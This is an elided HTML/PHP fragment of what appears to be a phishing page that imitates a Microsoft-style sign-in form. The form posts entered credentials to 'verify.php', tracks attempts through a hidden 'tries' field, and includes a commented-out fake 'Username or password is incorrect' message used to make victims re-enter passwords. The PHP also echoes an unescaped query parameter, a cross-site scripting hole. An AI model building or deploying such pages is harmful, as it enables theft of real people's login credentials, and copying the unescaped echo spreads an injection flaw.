...
<body data-bind="defineGlobals: ServerData, bodyCssClass" class="cb" style="display: block;" data-gr-c-s-loaded="true">
    ...
    <div>
        ...
        <form name="f1" id="i0281" novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off" action="verify.php" onsubmit="return checkSubmit()">
                                        ...
                                        <div class="row">
                                            ...
                                            <div class="form-group col-md-24">
                                                ...
                                                <div class="placeholderContainer" id="emField">
                                                    <input type="text" style="display:none" id="trt1" name="trt1" value="<?php if(isset($_GET['tries'])){echo $_GET['tries'];}else {echo '1';} ?>">
...
//$('#errorBar').text('Username or password is incorrect. Please try again.');
